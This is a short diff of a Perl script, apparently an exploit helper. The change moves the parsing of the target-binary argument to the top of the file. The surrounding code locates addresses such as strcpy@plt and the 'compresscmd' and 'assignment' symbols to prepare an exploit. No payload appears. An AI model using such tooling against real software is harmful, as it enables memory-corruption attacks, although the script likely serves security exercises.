@@ -1,5 +1,7 @@
 #!/usr/bin/env perl
 
+$binary = shift or die "usage: $0 <binary> [offset before target]\n";
+
 sub info {printf STDERR @_}
 
 sub get_addr {
@@ -32,7 +34,6 @@ prompt: print TTY "Enter the correct address: ";
 
 info "Automatically finding exploit addresses...\n";
 
-$binary = shift or die "usage: $0 <binary> [offset before target]\n";
 $strcpy = get_addr $binary, -d => qr/.*<strcpy\@plt>/;
 $compress = get_addr $binary, -t => qr/.*\bcompresscmd\s*$/;
 $assignment = get_addr $binary, -t => qr/.*\bassignment\s*$/;
